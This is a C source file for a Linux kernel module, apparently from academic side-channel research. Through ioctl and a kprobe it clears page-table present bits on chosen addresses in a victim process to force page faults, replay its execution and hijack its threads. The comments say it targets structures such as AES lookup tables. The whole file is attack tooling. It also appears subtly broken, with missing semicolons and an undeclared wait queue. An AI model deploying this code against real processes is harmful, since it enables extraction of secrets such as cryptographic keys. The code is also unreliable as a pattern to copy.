/*
 * This version uses the following kernel features:
 *      1. Ioctl to communicate with userspace
 *      2. Kprobes to add code to the pf handler
 */

#include <asm/cacheflush.h>
#include <asm/io.h>
#include <asm/mmu_context.h>
#include <asm/pgalloc.h>
#include <asm/pgtable.h>
#include <asm/tlb.h>
#include <asm/tlbflush.h>
#include <asm/uaccess.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/hrtimer.h>
#include <linux/hugetlb.h>
#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/ktime.h>
#include <linux/memcontrol.h>
#include <linux/mm.h>
#include <linux/mman.h>
#include <linux/mmu_notifier.h>
#include <linux/module.h>
#include <linux/pagemap.h>
#include <linux/pid.h>
#include <linux/rmap.h>
#include <linux/sched.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/swap.h>
#include <linux/swapops.h>
#include <linux/syscalls.h>
#include <linux/timer.h>
#include <linux/types.h>
#include <linux/atomic.h>
#include <linux/wait.h>
#include <linux/delay.h>

#include "nuke_mod.h"
#include "util.h"

MODULE_LICENSE("GPL v2");

// Ioctl variables
#define DEVICE_NAME "nuke_mod"
#define BUF_LEN 80		// Size of ioctl input buffer
static int Device_Open = 0;

// Kprobe struct used to add code to the page fault handler
// NOTE: notify_attack is actually a function we added to the 
// kernel and that is why microscope requires a custom kernel.
static struct kprobe kp = {
	.symbol_name = "notify_attack",
};

// Microscope variables
static uint64_t fault_cnt = 0, fault_fault_cnt = 0;

// APA variables
static struct nuke_info_t special;
static struct nuke_info_t *nuke_info_head = NULL;
static uint8_t monitoring = 0, hijack_done = 0, hijack_start = 0, resume_hijacked_thread = 0, last_iteration = 0;
static int thread_count = 0, join_count = 0;
static DEFINE_SPINLOCK(lock_for_waiting);
static DECLARE_WAIT_QUEUE_HEAD(waiting_wait_queue);

//region IOCTL Functions
//---------------------------------------------------------------------------------------

/*
 * device_open is invoked when the victim connects to the char device.
 */
static int device_open(struct inode *inode, struct file *file)
{
	if (Device_Open)
		return -EBUSY;

	Device_Open++;
	try_module_get(THIS_MODULE);
	return 0;
}

/*
 * device_release is invoked when the victim disconnects from the char device.
 */
static int device_release(struct inode *inode, struct file *file)
{
	Device_Open--;

	module_put(THIS_MODULE);
	return 0;
}

static int check_condition(int my_thread_id) {
	if (hijack_done == 1) {	// finished hijack
		pr_info("Magic batch to happened on last thread, thread %d released\n", my_thread_id);
		return 1;
	}
	
	if (hijack_start == 1 && my_thread_id == thread_count) {	// I am the thread to be hijacked
		pr_info("Letting thread %d continue\n", my_thread_id);
		hijack_start = 0;
		return 1;
	}

	return 0;
}

/*
 * device_write identifies the requested write from IOCTL and routes it to the proper function.
 */
static ssize_t device_write(struct file *file, const char __user *buffer, size_t length, loff_t *offset, enum call_type type)
{
	int i;
	uint64_t address;
	char write_str[BUF_LEN];
	char *write_str_ptr;
	spinlock_t *ptlp;
	int my_thread_id;

	// Store user space buffer variable (representing the address) into write_str
	for (i = 0; i < length && i < BUF_LEN; i++)
		get_user(write_str[i], buffer + i);
	write_str_ptr = write_str;

	// Convert the string of the write_str into an uint64_t (address).
	// Note that setting the base to zero indicates that the base should be determined
	// from the leading digits of write_str. The default is decimal, a leading '0'
	// indicates octal, and a leading '0x' or '0X' indicates hexadecimal.
    // (In this case I think we are sending the address as an integer base 10.)
	kstrtou64(write_str_ptr, 0, &address);

	// Identify the requested ioctl call
	switch (type) {
	case APPEND_ADDR:
		pr_info("Storing addr %p\n", (void *)address);
        store_nuked_address(&nuke_info_head, address);
        break;
	
	case PASS_SPECIAL_ADDR:
		pr_info("Storing special addr %p\n", (void *)address);
        
		special.nuke_virtual_addr = address;
		special.nuke_mm = current->mm;
		do_page_walk(special.nuke_mm, address, &(special.nuke_pte), &ptlp);

        break;
		
	case START_MONITORING:
		pr_info("On the lookout for page faults of the stored addresses\n");
		monitoring = 1;
		break;

	case STOP_MONITORING:
		pr_info("Attack complete: I will forget everything you told me down here\n");
		monitoring = 0;
		clean_up_stored_addresses(&nuke_info_head);
		break;

	case WAIT:
		spin_lock(&lock_for_waiting);
		thread_count++;
		my_thread_id = thread_count;	// indexes start from 1
		spin_unlock(&lock_for_waiting);
		
		msleep(1000);	// wait for all threads to be launched
		wait_event_interruptible(waiting_wait_queue, check_condition(my_thread_id) == 1)
		break;
	
	case JOIN:
		pr_info("Called hijacked pthread join\n");
		hijack_start = 1;	// when the first join happens, it means that all threads have been launched
		wake_up(&precompute_wait);

		// If all threads have called join that means that only the hijacked thread remains
		join_count += 1;	// indexes start from 1
		if (join_count == thread_count) {
			pr_info("n-1 threads finished. Resuming last thread for one more iteration\n");
			last_iteration = 1;
			monitoring = 1;
			
			arbitrarily_cause_page_fault(&(special.nuke_pte), special.nuke_virtual_addr);
			resume_hijacked_thread = 1;
			wake_up(&precompute_wait);

			// Now wait for one more iteration of that thread (until the model page fault)
			// and then let this thread finish too.
			wait_event_interruptible(waiting_wait_queue, last_iteration == 0)
		}
        
        break;

	default:
		break;
	}

	// Return number of characters read
	return i;
}

/*
 * device_ioctl services IOCTL requests to this character device
 * MSG - Just store the message into the char device (nothing microscope-related)
 * NUKE_ADDR - Pass the address to nuke (e.g., the replay handle)
 * MONITOR_ADDR - Pass the base monitor address (e.g. the AES Td tables), we will search for the actual one
 * PREP_PF - Set up the replay mechanism through page faults.
 */
long device_ioctl(struct file *file, unsigned int ioctl_num, unsigned long ioctl_param)
{
	int i = 0;
	char *temp;
	char ch;

	// pr_info("IOCTL param %u\n", ioctl_num);
	temp = (char *)ioctl_param;
	get_user(ch, temp);
	for (i = 0; ch && i < BUF_LEN; i++, temp++) {
		get_user(ch, temp);
	}

	switch (ioctl_num) {
	case IOCTL_APPEND_ADDR:
		device_write(file, (char *)ioctl_param, i, 0, APPEND_ADDR);
		break;
	case IOCTL_PASS_SPECIAL_ADDR:
		device_write(file, (char *)ioctl_param, i, 0, PASS_SPECIAL_ADDR);
		break;
	case IOCTL_START_MONITORING:
		device_write(file, (char *)ioctl_param, i, 0, START_MONITORING);
		break;
	case IOCTL_STOP_MONITORING:
		device_write(file, (char *)ioctl_param, i, 0, STOP_MONITORING);
		break;
	case IOCTL_WAIT:
		device_write(file, (char *)ioctl_param, i, 0, WAIT);
		break;
	case IOCTL_JOIN:
		device_write(file, (char *)ioctl_param, i, 0, JOIN);
		break;
	default:
		break;
	}

	return 0;
}

/*
 * Ioctl operations struct - defines the supported operations
 * Ioctl code is mainly from: https://linux.die.net/lkmpg/x892.html
 */
struct file_operations Fops = {
	.unlocked_ioctl = device_ioctl,
	.open = device_open,
	.release = device_release,
};

//---------------------------------------------------------------------------------------
//endregion

/*
 * handler_fault is invoked in the case of a nested page fault while we were
 * executing the kprobes trampoline code (see post_handler).
 * Usually this means that we tried to access an address we shouldn't. In this
 * scenario we stop the attack gracefully. In normal operation fault-on-fault
 * should not be triggered.
 */
static int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
{
    pte_t pte, temp_pte, *faulting_pte;
    faulting_pte = (pte_t *) regs->di;
    pte = *faulting_pte;

	fault_fault_cnt++;
	pr_info("fault-on-fault\n");

    // Cancel this nuke
	if(!(pte_flags(pte) & _PAGE_PRESENT) && (pte_flags(pte) & _PAGE_PROTNONE)) {
        temp_pte = pte_set_flags(pte, _PAGE_PRESENT);
        set_pte(faulting_pte, temp_pte);
    }

    // Mark attack as off
	monitoring = 0;

	// We let the kprobe handler to handle the page fault
	return 0;
}

/*
 * pre_handler is invoked before the notify_attack (memory.c)
 * we don't have to perform any steps here.
 */
static int pre_handler(struct kprobe *p, struct pt_regs *regs) { return 0; }

static int pte_in_list(uint64_t v0) 
{
	// Loop over list of addresses
	uint64_t v1;
	struct nuke_info_t *tmp = nuke_info_head;
	while(tmp != NULL) {

		// Check if tmp is the one we want
		v1 = pte_pfn(*(tmp->nuke_pte));
		if (v0 == v1) {
			return 1;
		}

        tmp = tmp->next;
	}

	return 0;
}

static void post_handler(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
{
	uint64_t v0 = 0, v1 = 0;
    pte_t pte, temp_pte, *faulting_pte;
    faulting_pte = (pte_t *) regs->di;	// get arg from notify_attack
    pte = *faulting_pte;

	if (faulting_pte) {

		// Note that this does not handle multi-threading
		if (monitoring == 1) {

			// Check if the pte of the current page fault could be of interest
			v0 = pte_pfn(*faulting_pte);
            v1 = pte_pfn(*(special.nuke_pte));
			if (pte_in_list(v0) == 1) {

				// Check if the pte of the current page fault is of the stored addresses
                if(!(pte_flags(pte) & _PAGE_PRESENT) && (pte_flags(pte) & _PAGE_PROTNONE)) {

					// Count fault
                	fault_cnt++;
                    pr_info("Stored address page fault %lld\n", fault_cnt);

					// Undo arbitrarily caused page fault
                    temp_pte = pte_set_flags(pte, _PAGE_PRESENT);
                    set_pte(faulting_pte, temp_pte);

					// Ensure the special page faults at its next access
					if (fault_cnt == 1) {
						pr_info("The model should fault again after this\n");
						arbitrarily_cause_page_fault(&(special.nuke_pte), special.nuke_virtual_addr);
					}

					// Check threshold
					if (last_iteration == 0 && fault_cnt > 24) {
						monitoring = 0;
						hijack_done = 1;
						wake_up(&precompute_wait);
						pr_info("Putting thread 0 to sleep and waking up other threads now\n");

						// Wait until ready to resume
						wait_event_interruptible(waiting_wait_queue, resume_hijacked_thread == 1)
					}
                }

		    } else if (v0 == v1) {
				
				// Check if the pte of the current page fault is of the special addresses
                if(!(pte_flags(pte) & _PAGE_PRESENT) && (pte_flags(pte) & _PAGE_PROTNONE)) {

					// Reset counter
					fault_cnt = 0;
                    pr_info("Model address page fault: resetting counter\n");

					// Undo arbitrarily caused page fault
                    temp_pte = pte_set_flags(pte, _PAGE_PRESENT);
                    set_pte(faulting_pte, temp_pte);

					if (last_iteration == 1) {
						last_iteration = 0;
						wake_up(&precompute_wait);

					} else {
						// Ensure the stored addresses page fault at their next access
						struct nuke_info_t *tmp = nuke_info_head;
						while(tmp != NULL) {
							arbitrarily_cause_page_fault(&(tmp->nuke_pte), tmp->nuke_virtual_addr);
							tmp = tmp->next;
						}
					}
                }
			}
		}
	}
}

/*
 * init_mudule registers the device and the trampoline kprobes code
 */
int init_module()
{
	int ret_val;

	// Register ioctl for nuke_mod
	// Read about ioctl here: https://stackoverflow.com/questions/15807846/ioctl-linux-device-driver/15809221
	ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &Fops);
	if (ret_val < 0) {
		pr_alert("Registering the device failed with %d\n", ret_val);
		return ret_val;
	}

	// Setup kprobes for notify_attack() in memory.c
	kp.pre_handler = pre_handler;
	kp.post_handler = post_handler;
	kp.fault_handler = handler_fault;   // called if executing addr causes a fault (eg. page fault)

	// Register kprobe
	ret_val = register_kprobe(&kp);
	if (ret_val < 0) {
		pr_alert("Registering probe failed with %d\n", ret_val);
		return ret_val;
	}

	pr_info("Nuke module loaded. If a channel does not exist run: mknod %s c %d 0\n", DEVICE_FILE_NAME, MAJOR_NUM);

	return 0;
}

/*
 * cleanup_module unregisters the device, the probes, and disables the attack
 */
void cleanup_module()
{
	unregister_chrdev(MAJOR_NUM, DEVICE_NAME);
	unregister_kprobe(&kp);
}
